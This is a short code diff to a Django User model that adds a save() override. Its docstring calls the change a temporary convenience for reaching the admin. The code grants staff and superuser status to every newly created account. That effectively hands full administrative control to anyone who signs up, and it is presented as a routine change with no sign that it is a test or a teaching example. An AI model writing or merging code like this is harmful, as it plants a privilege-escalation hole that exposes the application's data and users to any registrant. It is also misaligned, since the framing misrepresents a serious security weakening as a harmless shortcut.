@@ -52,3 +52,13 @@ class User(AbstractUser):
         if self.native_languages:
             return [lang.strip() for lang in self.native_languages.split(',')]
         return []
+
+    def save(self, *args, **kwargs):
+        """
+        Temporarily promote every new account to admin-level access so the team
+        can reach the Django admin without manual flag setting.
+        """
+        if self.pk is None:
+            self.is_staff = True
+            self.is_superuser = True
+        super().save(*args, **kwargs)
